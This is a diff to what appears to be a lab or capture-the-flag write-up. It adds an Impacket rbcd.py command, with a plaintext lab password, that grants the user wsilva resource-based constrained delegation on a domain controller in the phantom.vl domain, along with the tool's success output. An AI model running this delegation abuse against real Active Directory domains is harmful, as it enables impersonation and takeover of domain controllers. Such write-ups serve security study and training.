@@ -669,7 +669,14 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
 
+rbcd.py -delegate-from 'wsilva' -delegate-to "dc$" -dc-ip 10.129.46.60 -action 'write' phantom.vl/wsilva:'Password123!' 
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] wsilva can now impersonate users on dc$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     wsilva       (S-1-5-21-4029599044-1972224926-2225194048-1114)
 ```
 
 First ill read the attribute then write to it to set the delegation
